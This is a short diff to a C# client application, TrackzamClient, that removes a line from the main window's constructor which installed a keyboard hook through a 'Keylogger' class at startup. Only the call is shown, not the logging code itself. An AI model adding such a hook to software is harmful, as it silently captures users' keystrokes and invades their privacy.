@@ -11,7 +11,6 @@ namespace TrackzamClient
     {
         public MainWindow()
         {
-            Keylogger._hookID = Keylogger.SetHook(Keylogger._proc);
             InitializeComponent();
             InitializeUI();
             _sessionManager = new SessionManager(this);
